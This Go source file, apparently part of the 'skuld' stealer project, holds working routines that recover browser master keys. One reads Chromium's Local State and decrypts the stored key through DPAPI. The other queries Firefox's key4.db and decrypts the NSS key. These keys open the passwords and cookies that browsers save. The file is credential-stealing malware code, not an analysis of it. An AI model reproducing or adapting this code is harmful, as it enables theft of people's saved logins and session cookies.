package browsers

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	_ "modernc.org/sqlite"
)

func (c *Chromium) GetMasterKey(path string) error {
	b, err := fileutil.ReadFile(filepath.Join(path, "Local State"))
	if err != nil {
		return err
	}
	defer os.Remove("masterkey_db")

	var data struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	err = json.Unmarshal([]byte(b), &data)
	if err != nil {
		return err
	}

	key, err := base64.StdEncoding.DecodeString(data.OsCrypt.EncryptedKey)
	if err != nil {
		return err
	}

	c.MasterKey, err = DPAPI(key[5:])
	if err != nil {
		return err
	}

	return nil
}

func (g *Gecko) GetMasterKey(path string) error {
	var globalSalt, metaBytes, nssA11, nssA102, key []byte

	keyDB, err := GetDBConnection(filepath.Join(path, "key4.db"))

	if err != nil {
		return err
	}

	if err = keyDB.QueryRow(`SELECT item1, item2 FROM metaData WHERE id = 'password'`).Scan(&globalSalt, &metaBytes); err != nil {
		return err
	}

	if err = keyDB.QueryRow(`SELECT a11, a102 from nssPrivate`).Scan(&nssA11, &nssA102); err != nil {
		return err
	}

	metaPBE, err := NewASN1PBE(metaBytes)
	if err != nil {
		return err
	}

	k, err := metaPBE.Decrypt(globalSalt, key)
	if err != nil {
		return err
	}

	if !bytes.Contains(k, []byte("password-check")) {
		return errors.New("password check error")
	}

	if !bytes.Equal(nssA102, []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}) {
		return errors.New("nssA102 error")
	}

	nssPBE, err := NewASN1PBE(nssA11)
	if err != nil {
		return err
	}

	finallyKey, err := nssPBE.Decrypt(globalSalt, key)
	if err != nil {
		return err
	}

	g.MasterKey = finallyKey[:24]
	return nil
}
